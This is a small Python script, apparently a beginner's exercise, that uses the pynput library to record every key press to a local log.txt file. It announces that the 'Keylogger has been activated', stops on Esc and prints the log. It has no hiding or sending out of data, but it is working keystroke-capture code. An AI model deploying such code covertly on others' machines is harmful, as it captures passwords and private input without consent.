from pynput import keyboard
import sys

class escException(Exception):pass

def writeToFile(key):
    keydata=str(key)
    if key == keyboard.Key.esc: #if esc key is pressed, raise the exception that will terminate program
        raise escException(key)
    else:
        with open("log.txt",'a') as file: #opens the log.txt file and prepares it to get appended
            file.write(keydata + '\n') #writes recorded key presses to log.txt line by line

def printFile(): #prints all the recorded data in log.txt to the console
    f = open('log.txt','r')
    fileContent = f.read()
    print(fileContent)

#main
print("Keylogger has been activated! \nLogs will be in the log.txt file... \n[press 'esc' to stop the program]") #Console output that lets user know that the program is running and how to stop it

with keyboard.Listener(on_press=writeToFile) as l:
    try:
        l.join() 
    except escException as e:
        print("{0} was pressed: terminating program & displaying log".format(e.args[0]))
        printFile()
        sys.exit(1) #forces program to stop 